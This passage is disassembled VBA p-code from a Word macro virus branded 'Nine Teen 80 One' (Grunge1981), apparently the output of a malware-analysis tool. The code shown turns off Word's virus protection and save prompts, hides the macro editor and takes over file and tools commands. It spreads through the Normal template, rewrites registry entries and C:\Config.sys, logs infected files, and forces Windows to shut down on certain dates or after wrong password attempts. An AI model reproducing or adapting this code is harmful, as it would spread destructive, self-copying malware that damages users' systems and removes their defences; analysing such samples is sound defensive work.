' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' Line #110:
' 	EndSub 
' Line #111:
' Line #112:
' 	FuncDefn (Sub IHate())
' Line #113:
' 	Ld OpWord 
' 	Ld OpWord 
' 	FnLen 
' 	ArgsCall CapWord 0x0002 
' Line #114:
' 	Ld Now 
' 	LitStr 0x0008 "00:00:30"
' 	ArgsLd TimeValue 0x0001 
' 	Add 
' 	LitStr 0x0004 "CMsg"
' 	ParamNamed New 
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' Line #115:
' 	EndSub 
' Line #116:
' 	FuncDefn (Sub CMsg())
' Line #117:
' 	Ld ClWord 
' 	Ld ClWord 
' 	FnLen 
' 	ArgsCall CapWord 0x0002 
' Line #118:
' 	Ld Now 
' 	LitStr 0x0008 "00:00:50"
' 	ArgsLd TimeValue 0x0001 
' 	Add 
' 	LitStr 0x0002 "M1"
' 	ParamNamed New 
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' Line #119:
' 	EndSub 
' Line #120:
' 	FuncDefn (Sub M1())
' Line #121:
' 	Ld IHeart 
' 	Ld IHeart 
' 	FnLen 
' 	ArgsCall CapWord 0x0002 
' Line #122:
' 	Ld Now 
' 	LitStr 0x0008 "00:01:10"
' 	ArgsLd TimeValue 0x0001 
' 	Add 
' 	LitStr 0x0002 "M2"
' 	ParamNamed New 
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' Line #123:
' 	EndSub 
' Line #124:
' 	FuncDefn (Sub M2())
' Line #125:
' 	Ld Forget 
' 	Ld Forget 
' 	FnLen 
' 	ArgsCall CapWord 0x0002 
' Line #126:
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ShowVisualBasicEditor 
' Line #127:
' 	Ld Now 
' 	LitStr 0x0008 "00:01:30"
' 	ArgsLd TimeValue 0x0001 
' 	Add 
' 	LitStr 0x0002 "M3"
' 	ParamNamed New 
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' Line #128:
' 	EndSub 
' Line #129:
' 	FuncDefn (Sub M3())
' Line #130:
' 	OnError (Resume Next) 
' Line #131:
' 	Ld Fucks 
' 	Ld Fucks 
' 	FnLen 
' 	ArgsCall CapWord 0x0002 
' Line #132:
' 	Ld Now 
' 	LitStr 0x0008 "00:01:50"
' 	ArgsLd TimeValue 0x0001 
' 	Add 
' 	LitStr 0x0007 "WordMsg"
' 	ParamNamed New 
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' Line #133:
' 	Ld Date 
' 	ArgsLd WeekDay 0x0001 
' 	Ld vbFriday 
' 	Ne 
' 	Paren 
' 	Ld Date 
' 	ArgsLd WeekDay 0x0001 
' 	Ld vbWednesday 
' 	Ne 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #134:
' 	StartWithExpr 
' 	Ld Assistant 
' 	MemLd NewBalloon 
' 	With 
' Line #135:
' 	Ld msoButtonSetOK 
' 	MemStWith Button 
' Line #136:
' 	Ld msoIconTip 
' 	MemStWith Icon 
' Line #137:
' 	Ld msoAnimationSaving 
' 	MemStWith Animation 
' Line #138:
' 	LitStr 0x000D "For My Friend"
' 	MemStWith Heading 
' Line #139:
' 	LineCont 0x0004 11 00 0C 00
' 	Ld ClWord 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld IHeart 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld Forget 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld Fucks 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x001D "        9 Teen 80 One is cool"
' 	Concat 
' 	MemStWith Then 
' Line #140:
' 	LitDI2 0x00C8 
' 	LitDI2 0x00C8 
' 	Ld Application 
' 	MemLd Assistant 
' 	ArgsMemCall Move 0x0002 
' Line #141:
' 	ArgsMemCallWith show 0x0000 
' Line #142:
' 	EndWith 
' Line #143:
' 	EndIfBlock 
' Line #144:
' 	ArgsCall Beep 0x0000 
' Line #145:
' 	Ld Now 
' 	LitStr 0x0008 "00:00:03"
' 	ArgsLd TimeValue 0x0001 
' 	Add 
' 	LitStr 0x0007 "Calldoc"
' 	ParamNamed New 
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' Line #146:
' 	EndSub 
' Line #147:
' 	FuncDefn (Sub CProp())
' Line #148:
' 	OnError (Resume Next) 
' Line #149:
' 	ArgsCall Beep 0x0000 
' Line #150:
' 	Dim 
' 	VarDefn aDocProp (As DocumentProperty)
' Line #151:
' 	StartForVariable 
' 	Ld aDocProp 
' 	EndForVariable 
' 	Ld NormalTemplate 
' 	MemLd CustomDocumentProperties 
' 	ForEach 
' Line #152:
' 	Ld aDocProp 
' 	ArgsMemCall Delete 0x0000 
' Line #153:
' 	StartForVariable 
' 	Ld aDocProp 
' 	EndForVariable 
' 	NextVar 
' Line #154:
' 	LineCont 0x0010 05 00 0C 00 09 00 0C 00 0D 00 0C 00 11 00 0C 00
' 	LitStr 0x0010 "Nìñè Tèèñ 80 Oñè"
' 	ParamNamed New 
' 	Ld msoPropertyTypeNumber 
' 	ParamNamed TypeOf 
' 	LitStr 0x0003 "112"
' 	ParamNamed Value 
' 	LitVarSpecial (False)
' 	ParamNamed LinkToContent 
' 	Ld NormalTemplate 
' 	MemLd CustomDocumentProperties 
' 	ArgsMemCall Add 0x0004 
' Line #155:
' 	EndSub 
' Line #156:
' Line #157:
' 	FuncDefn (Sub GrungeCek())
' Line #158:
' 	OnError (Resume Next) 
' Line #159:
' 	StartWithExpr 
' 	Ld Application 
' 	MemLd Options 
' 	With 
' Line #160:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #161:
' 	LitVarSpecial (False)
' 	MemStWith SavePropertiesPrompt 
' Line #162:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #163:
' 	EndWith 
' Line #164:
' 	LitVarSpecial (True)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ShowVisualBasicEditor 
' Line #165:
' 	LitVarSpecial (False)
' 	LitDI2 0x0009 
' 	Ld ActiveDocument 
' 	MemLd CommandBars 
' 	ArgsMemLd Item 0x0001 
' 	MemSt Enabled 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	LitDI2 0x001D 
' 	Ld ActiveDocument 
' 	MemLd CommandBars 
' 	ArgsMemLd Item 0x0001 
' 	MemSt Enabled 
' Line #166:
' 	Ld MG2 
' 	St UserName 
' 	BoS 0x0000 
' 	LitStr 0x000B "Trust to me"
' 	St UserInitials 
' 	BoS 0x0000 
' 	LitStr 0x0011 "www.9Teen80One.id"
' 	St UserAddress 
' Line #167:
' 	EndSub 
' Line #168:
' Line #169:
' 	FuncDefn (Sub FileSave())
' Line #170:
' 	OnError (Resume Next) 
' Line #171:
' 	LitStr 0x0027 "Saving Nìñè Tèèñ 80 Oñè, please wait..."
' 	LitDI2 0x0021 
' 	ArgsCall CapWord 0x0002 
' Line #172:
' 	ArgsCall Saving 0x0000 
' Line #173:
' 	Ld MG2 
' 	Ld MG2 
' 	FnLen 
' 	ArgsCall CapWord 0x0002 
' Line #174:
' 	EndSub 
' Line #175:
' 	FuncDefn (Sub AutoSave())
' Line #176:
' 	ArgsCall FileSave 0x0000 
' Line #177:
' 	EndSub 
' Line #178:
' Line #179:
' 	FuncDefn (Sub FileOpen())
' Line #180:
' 	OnError (Resume Next) 
' Line #181:
' 	ArgsCall WordMsg 0x0000 
' Line #182:
' 	ArgsCall GrungeCek 0x0000 
' Line #183:
' 	Ld wdDialogFileOpen 
' 	ArgsLd Dialogs 0x0001 
' 	MemLd show 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #184:
' 	ArgsCall AutoOpen 0x0000 
' Line #185:
' 	EndIfBlock 
' Line #186:
' 	EndSub 
' Line #187:
' 	FuncDefn (Sub RegisterSys())
' Line #188:
' 	Dim 
' 	VarDefn HCU (As String)
' 	VarDefn HLM (As String)
' 	VarDefn Fold (As String)
' Line #189:
' 	LitStr 0x0011 "HKEY_CURRENT_USER"
' 	St HCU 
' Line #190:
' 	LitStr 0x0012 "HKEY_LOCAL_MACHINE"
' 	St HLM 
' Line #191:
' 	LitStr 0x002A "\SOFTWARE\Microsoft\Windows\CurrentVersion"
' 	St Fold 
' Line #192:
' 	LitStr 0x0024 "Kill Any Register, and i can't found"
' 	LitStr 0x0000 ""
' 	Ld HLM 
' 	LitStr 0x0015 "\>$#1Nìñè Tèèñ 80 Oñè"
' 	Concat 
' 	LitStr 0x0010 "Nìñè Tèèñ 80 Oñè"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #193:
' 	LitStr 0x0010 "Nìñè Tèèñ 80 Oñè"
' 	LitStr 0x0000 ""
' 	Ld HLM 
' 	Ld Fold 
' 	Concat 
' 	LitStr 0x000F "RegisteredOwner"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #194:
' 	Ld MG2 
' 	LitStr 0x0000 ""
' 	Ld HLM 
' 	Ld Fold 
' 	Concat 
' 	LitStr 0x0016 "RegisteredOrganization"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #195:
' 	LitStr 0x0016 "Nìñè Tèèñ 80 Oñè Pañèl"
' 	LitStr 0x0000 ""
' 	Ld HCU 
' 	LitStr 0x003E "\Software\Classes\CLSID\{21EC2020-3AEA-1069-A2DD-08002B30309D}"
' 	Concat 
' 	LitStr 0x0000 ""
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #196:
' 	LitStr 0x000D "Døçùmèñt 1981"
' 	LitStr 0x0000 ""
' 	Ld HLM 
' 	LitStr 0x003E "\Software\CLASSES\CLSID\{450D8FBA-AD25-11D0-98A8-0800361B1103}"
' 	Concat 
' 	LitStr 0x0000 ""
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #197:
' 	LitStr 0x000F "Rè©ÿ©lè iñ 1981"
' 	LitStr 0x0000 ""
' 	Ld HCU 
' 	LitStr 0x003E "\Software\Classes\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}"
' 	Concat 
' 	LitStr 0x0000 ""
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #198:
' 	LitStr 0x000C "Prìñtèr 1981"
' 	LitStr 0x0000 ""
' 	Ld HCU 
' 	LitStr 0x003E "\Software\Classes\CLSID\{2227A280-3AEA-1069-A2DE-08002B30309D}"
' 	Concat 
' 	LitStr 0x0000 ""
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #199:
' 	LitStr 0x0010 "Nìñè Tèèñ 80 Oñè"
' 	LitStr 0x0000 ""
' 	Ld HCU 
' 	LitStr 0x003E "\Software\Classes\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}"
' 	Concat 
' 	LitStr 0x0000 ""
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #200:
' 	LitStr 0x0007 "By-1981"
' 	LitStr 0x0000 ""
' 	Ld HCU 
' 	LitStr 0x001C "\Control Panel\International"
' 	Concat 
' 	LitStr 0x0005 "s1159"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #201:
' 	LitStr 0x0007 "By-1981"
' 	LitStr 0x0000 ""
' 	Ld HCU 
' 	LitStr 0x001C "\Control Panel\International"
' 	Concat 
' 	LitStr 0x0005 "s2359"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #202:
' 	LitStr 0x000B "HH:mm:ss tt"
' 	LitStr 0x0000 ""
' 	Ld HCU 
' 	LitStr 0x001C "\Control Panel\International"
' 	Concat 
' 	LitStr 0x000B "sTimeFormat"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #203:
' 	LitStr 0x0010 "Nìñè Tèèñ 80 Oñè"
' 	LitStr 0x0000 ""
' 	Ld HLM 
' 	Ld Fold 
' 	Concat 
' 	LitStr 0x0009 "\Winlogon"
' 	Concat 
' 	LitStr 0x0012 "LegalNoticeCaption"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #204:
' 	Ld ClWord 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld IHeart 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld Forget 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld Fucks 
' 	Concat 
' 	LitStr 0x0000 ""
' 	Ld HLM 
' 	Ld Fold 
' 	Concat 
' 	LitStr 0x0009 "\Winlogon"
' 	Concat 
' 	LitStr 0x000F "LegalNoticeText"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #205:
' 	EndSub 
' Line #206:
' 	FuncDefn (Sub AutoClose())
' Line #207:
' 	OnError (Resume Next) 
' Line #208:
' 	Dim 
' 	VarDefn Data (As String)
' 	VarDefn Tim (As String)
' Line #209:
' 	Ld Date 
' 	LitStr 0x0012 "DDDD, DD-MMMM-YYYY"
' 	ArgsLd Format$ 0x0002 
' 	St Data 
' Line #210:
' 	Ld Time 
' 	LitStr 0x000D "HH:MM:SS AMPM"
' 	ArgsLd Format$ 0x0002 
' 	St Tim 
' Line #211:
' 	Ld MG2 
' 	Ld MG2 
' 	FnLen 
' 	ArgsCall CapWord 0x0002 
' Line #212:
' 	LitStr 0x0010 "Nìñè Tèèñ 80 Oñè"
' 	Ld Application 
' 	MemSt UserName 
' Line #213:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld Documents 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #214:
' 	ArgsCall RegisterSys 0x0000 
' Line #215:
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion"
' 	LitStr 0x000A "SystemRoot"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St PathFile 
' Line #216:
' 	Ld PathFile 
' 	LitStr 0x000A "\System32x"
' 	Concat 
' 	Paren 
' 	ArgsCall MkDir 0x0001 
' Line #217:
' 	Ld Application 
' 	MemLd ActiveDocument 
' 	MemLd New 
' 	LitStr 0x0001 "-"
' 	Concat 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Concat 
' 	LitStr 0x0014 ";Date infected    : "
' 	Ld Data 
' 	Ld PathFile 
' 	LitStr 0x0015 "\System32x\Global.inf"
' 	Concat 
' 	ArgsCall WritePrivateProfileString 0x0004 
' Line #218:
' 	Ld Application 
' 	MemLd ActiveDocument 
' 	MemLd New 
' 	LitStr 0x0001 "-"
' 	Concat 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Concat 
' 	LitStr 0x0014 ";Time infected    : "
' 	Ld Tim 
' 	Ld PathFile 
' 	LitStr 0x0015 "\System32x\Global.inf"
' 	Concat 
' 	ArgsCall WritePrivateProfileString 0x0004 
' Line #219:
' 	Ld Application 
' 	MemLd ActiveDocument 
' 	MemLd New 
' 	LitStr 0x0001 "-"
' 	Concat 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Concat 
' 	LitStr 0x0014 ";File Name        : "
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Ld PathFile 
' 	LitStr 0x0015 "\System32x\Global.inf"
' 	Concat 
' 	ArgsCall WritePrivateProfileString 0x0004 
' Line #220:
' 	Ld Application 
' 	MemLd ActiveDocument 
' 	MemLd New 
' 	LitStr 0x0001 "-"
' 	Concat 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Concat 
' 	LitStr 0x0014 ";User Name        : "
' 	Ld Application 
' 	MemLd UserName 
' 	Ld PathFile 
' 	LitStr 0x0015 "\System32x\Global.inf"
' 	Concat 
' 	ArgsCall WritePrivateProfileString 0x0004 
' Line #221:
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion"
' 	LitStr 0x000A "SystemRoot"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St RootsyS 
' Line #222:
' 	LitStr 0x000D "C:\Config.sys"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #223:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "Device="
' 	Ld RootsyS 
' 	Concat 
' 	LitStr 0x0011 "\Command\Ansi.sys"
' 	Concat 
' 	PrintItemNL 
' Line #224:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0086 "SET WINPMT=$e[s$e[f$e[0;316;41;1m$e[K - I Don't Trust NoBody IF EveryBody Not Like Me (Nine Teen 80 One) - $_$e[0;40;37;1m$e[K$e[u$P$G"
' 	PrintItemNL 
' Line #225:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #226:
' 	ArgsCall MyDay 0x0000 
' Line #227:
' 	EndSub 
' Line #228:
' 	FuncDefn (Sub MyDay())
' Line #229:
' 	Ld Date 
' 	LitStr 0x000A "DD-MM-YYYY"
' 	ArgsLd Format$ 0x0002 
' 	St DT 
' Line #230:
' 	Ld DT 
' 	LitDI2 0x0002 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0002 "19"
' 	Eq 
' 	IfBlock 
' Line #231:
' 	LitStr 0x002D "Now is my lucky day, i hope you at enjoy now,"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0032 "Nìñè Tèèñ 80 Oñè is keep smile, bye...bye...bye..."
' 	Concat 
' 	ArgsCall MsgBox 0x0001 
' Line #232:
' 	LitDI2 0x0001 
' 	LitDI2 0x0000 
' 	ArgsCall ExitWindowsEx 0x0002 
' Line #233:
' 	EndIfBlock 
' Line #234:
' 	EndSub 
' Line #235:
' 	FuncDefn (Sub AutoExit())
' Line #236:
' 	OnError (Resume Next) 
' Line #237:
' 	ArgsCall MyDay 0x0000 
' Line #238:
' 	Ld Date 
' 	ArgsLd WeekDay 0x0001 
' 	Ld vbFriday 
' 	Eq 
' 	Paren 
' 	Ld Date 
' 	ArgsLd WeekDay 0x0001 
' 	Ld vbWednesday 
' 	Eq 
' 	Paren 
' 	Or 
' 	IfBlock 
' Line #239:
' 	OnError Salah 
' Line #240:
' 	ArgsCall M3 0x0000 
' Line #241:
' 	Ld ClWord 
' 	Ld ClWord 
' 	FnLen 
' 	ArgsCall CapWord 0x0002 
' Line #242:
' 	ExitSub 
' Line #243:
' 	Label Salah 
' Line #244:
' 	Ld OpWord 
' 	LitDI2 0x0010 
' 	Ld MG2 
' 	ArgsCall MsgBox 0x0003 
' Line #245:
' 	Ld ClWord 
' 	Ld ClWord 
' 	FnLen 
' 	ArgsCall CapWord 0x0002 
' Line #246:
' 	EndIfBlock 
' Line #247:
' 	EndSub 
' Line #248:
' 	FuncDefn (Sub viewvbcode())
' Line #249:
' 	ArgsCall ToolsMacro 0x0000 
' Line #250:
' 	EndSub 
' Line #251:
' 	FuncDefn (Sub ToggleFormsDesign())
' Line #252:
' 	ArgsCall ToolsMacro 0x0000 
' Line #253:
' 	EndSub 
' Line #254:
' 	FuncDefn (Sub viewcode())
' Line #255:
' 	ArgsCall ToolsMacro 0x0000 
' Line #256:
' 	EndSub 
' Line #257:
' 	FuncDefn (Sub FileClose())
' Line #258:
' 	OnError (Resume Next) 
' Line #259:
' 	ArgsCall AutoClose 0x0000 
' Line #260:
' 	Ld Application 
' 	MemLd ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #261:
' 	EndSub 
' Line #262:
' 	FuncDefn (Sub FileNewDefault())
' Line #263:
' 	OnError (Resume Next) 
' Line #264:
' 	LitStr 0x0005 "Cool "
' 	Ld MG2 
' 	Concat 
' 	Ld MG2 
' 	FnLen 
' 	LitDI2 0x0005 
' 	Add 
' 	ArgsCall CapWord 0x0002 
' Line #265:
' 	Ld WordBasic 
' 	ArgsMemCall FileNewDefault 0x0000 
' Line #266:
' 	Ld NormalTemplate 
' 	Ld ActiveDocument 
' 	ArgsCall CopyObject 0x0002 
' Line #267:
' 	EndSub 
' Line #268:
' 	FuncDefn (Sub FileExit())
' Line #269:
' 	ArgsCall AutoClose 0x0000 
' Line #270:
' 	Ld Application 
' 	ArgsMemCall Quit 0x0000 
' Line #271:
' 	EndSub 
' Line #272:
' 	FuncDefn (Sub FileNew())
' Line #273:
' 	OnError (Resume Next) 
' Line #274:
' 	Ld wdDialogToolsTemplates 
' 	ArgsLd Dialogs 0x0001 
' 	MemLd show 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	ArgsCall AutoOpen 0x0000 
' 	EndIf 
' Line #275:
' 	LitStr 0x0018 "Nìñè Tèèñ 80 Oñè is back"
' 	LitVarSpecial (True)
' 	ArgsCall SendKeys 0x0002 
' Line #276:
' 	EndSub 
' Line #277:
' 	FuncDefn (Sub HelpAbout())
' Line #278:
' 	OnError (Resume Next) 
' Line #279:
' 	Dim 
' 	VarDefn H
' Line #280:
' 	OnError Salah 
' Line #281:
' 	Ld Frm1981 
' 	ArgsMemCall show 0x0000 
' Line #282:
' 	ExitSub 
' Line #283:
' 	Label Salah 
' Line #284:
' 	LitStr 0x0016 "Please insert Password"
' 	Ld MG2 
' 	LitStr 0x0007 "Fuck Up"
' 	ArgsLd InputBox 0x0003 
' 	St H 
' Line #285:
' 	Ld H 
' 	LitStr 0x0005 "-*.*-"
' 	Eq 
' 	IfBlock 
' Line #286:
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #287:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ShowVisualBasicEditor 
' Line #288:
' 	ElseBlock 
' Line #289:
' 	Ld CekPas 
' 	LitDI2 0x0001 
' 	Add 
' 	St CekPas 
' Line #290:
' 	LitStr 0x003A "Wrong Password to open my zone, i hope you don't try again"
' 	LitDI2 0x0010 
' 	LitStr 0x0019 "Nìñè Tèèñ 80 Oñè PASSWORD"
' 	ArgsCall MsgBox 0x0003 
' Line #291:
' 	Ld CekPas 
' 	LitDI2 0x0003 
' 	Eq 
' 	IfBlock 
' Line #292:
' 	LitStr 0x0029 "I Kill You Now........,bye...bye...bye..."
' 	LitDI2 0x0030 
' 	LitStr 0x001A "Nìñè Tèèñ 80 Oñè Warning !"
' 	ArgsCall MsgBox 0x0003 
' Line #293:
' 	LitDI2 0x0001 
' 	LitDI2 0x0000 
' 	ArgsCall ExitWindowsEx 0x0002 
' Line #294:
' 	EndIfBlock 
' Line #295:
' 	EndIfBlock 
' Line #296:
' 	EndSub 
' Line #297:
' 	FuncDefn (Sub ToolsOptions())
' Line #298:
' 	Dim 
' 	VarDefn H
' Line #299:
' 	OnError (Resume Next) 
' Line #300:
' 	LitStr 0x0016 "Please insert Password"
' 	Ld MG2 
' 	LitStr 0x0007 "Fuck Up"
' 	ArgsLd InputBox 0x0003 
' 	St H 
' Line #301:
' 	Ld H 
' 	LitStr 0x0005 "-*.*-"
' 	Eq 
' 	IfBlock 
' Line #302:
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #303:
' 	Ld wdDialogToolsOptions 
' 	Ld Application 
' 	ArgsMemLd Dialogs 0x0001 
' 	ArgsMemCall show 0x0000 
' Line #304:
' 	ElseBlock 
' Line #305:
' 	Ld CekPas 
' 	LitDI2 0x0001 
' 	Add 
' 	St CekPas 
' Line #306:
' 	LitStr 0x003A "Wrong Password to open my zone, i hope you don't try again"
' 	LitDI2 0x0010 
' 	LitStr 0x0019 "Nine Teen 80 One PASSWORD"
' 	ArgsCall MsgBox 0x0003 
' Line #307:
' 	Ld CekPas 
' 	LitDI2 0x0003 
' 	Eq 
' 	IfBlock 
' Line #308:
' 	LitStr 0x0029 "I Kill You Now........,bye...bye...bye..."
' 	LitDI2 0x0030 
' 	LitStr 0x001A "Nine Teen 80 One Warning !"
' 	ArgsCall MsgBox 0x0003 
' Line #309:
' 	LitDI2 0x0001 
' 	LitDI2 0x0000 
' 	ArgsCall ExitWindowsEx 0x0002 
' Line #310:
' 	EndIfBlock 
' Line #311:
' 	EndIfBlock 
' Line #312:
' 	EndSub 
' Line #313:
' 	FuncDefn (Sub ToolsMacro())
' Line #314:
' 	OnError (Resume Next) 
' Line #315:
' 	ArgsCall M3 0x0000 
' Line #316:
' 	ArgsCall HelpAbout 0x0000 
' Line #317:
' 	Ld TMac 
' 	Ld TMac 
' 	FnLen 
' 	ArgsCall CapWord 0x0002 
' Line #318:
' 	StartWithExpr 
' 	Ld Assistant 
' 	MemLd NewBalloon 
' 	With 
' Line #319:
' 	Ld msoButtonSetOK 
' 	MemStWith Button 
' Line #320:
' 	LitStr 0x0013 "Regional Sales Data"
' 	MemStWith Heading 
' Line #321:
' 	Ld ClWord 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld IHeart 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld Forget 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld Fucks 
' 	Concat 
' 	MemStWith Then 
' Line #322:
' 	ArgsMemCallWith show 0x0000 
' Line #323:
' 	EndWith 
' Line #324:
' 	EndSub 
' Line #325:
' 	FuncDefn (Sub AutoExec())
' Line #326:
' 	OnError (Resume Next) 
' Line #327:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #328:
' 	LitDI2 0x0000 
' 	St CekPas 
' Line #329:
' 	Ld Date 
' 	LitStr 0x0002 "DD"
' 	ArgsLd Format$ 0x0002 
' 	LitDI2 0x0002 
' 	ArgsLd LBound 0x0002 
' 	LitDI2 0x001B 
' 	Eq 
' 	IfBlock 
' Line #330:
' 	LitStr 0x0034 "You can't open on this day, because i like this day."
' 	Ld Frm1981 
' 	MemLd lblday 
' 	MemSt Caption 
' Line #331:
' 	LitVarSpecial (True)
' 	St ThisDay 
' Line #332:
' 	Ld Frm1981 
' 	ArgsMemCall show 0x0000 
' Line #333:
' 	EndIfBlock 
' Line #334:
' 	LitVarSpecial (True)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #335:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #336:
' 	Ld NormalTemplate 
' 	ArgsLd FindME 0x0001 
' 	IfBlock 
' Line #337:
' 	ArgsCall CProp 0x0000 
' Line #338:
' 	LitStr 0x0019 "normal.Grunge1981.Calldoc"
' 	Ld Application 
' 	ArgsMemCall Run 0x0001 
' Line #339:
' 	ElseBlock 
' Line #340:
' 	Ld NormalTemplate 
' 	ArgsCall Grunge_Clear 0x0001 
' Line #341:
' 	ArgsCall CallNormal 0x0000 
' Line #342:
' 	OnError (Resume Next) 
' Line #343:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #344:
' 	EndIfBlock 
' Line #345:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000A 
' 	For 
' 	BoS 0x0000 
' 	Ld msoBarNoCustomize 
' 	Ld I 
' 	Ld Application 
' 	MemLd CommandBars 
' 	ArgsMemLd Item 0x0001 
' 	MemSt Protection 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #346:
' 	LitVarSpecial (True)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ShowVisualBasicEditor 
' Line #347:
' 	LitStr 0x0014 "Normal.Grunge1981.M3"
' 	Ld Application 
' 	ArgsMemCall Run 0x0001 
' Line #348:
' 	EndSub 
' Line #349:
' Line #350:
' 	FuncDefn (Sub AutoOpen())
' Line #351:
' 	OnError (Resume Next) 
' Line #352:
' 	LitDI2 0x0000 
' 	Ld RecentFiles 
' 	MemSt Maximum 
' Line #353:
' 	ArgsCall BackGround 0x0000 
' Line #354:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #355:
' 	LitVarSpecial (True)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #356:
' 	ArgsCall GrungeCek 0x0000 
' Line #357:
' 	ArgsCall WordMsg 0x0000 
' Line #358:
' 	Ld MG2 
' 	Ld MG2 
' 	FnLen 
' 	ArgsCall CapWord 0x0002 
' Line #359:
' 	Ld ActiveDocument 
' 	ArgsCall Grunge_Clear 0x0001 
' Line #360:
' 	Ld NormalTemplate 
' 	ArgsLd FindME 0x0001 
' 	IfBlock 
' Line #361:
' 	Ld ActiveDocument 
' 	ArgsCall Grunge_Clear 0x0001 
' Line #362:
' 	Ld Now 
' 	LitStr 0x0008 "00:00:05"
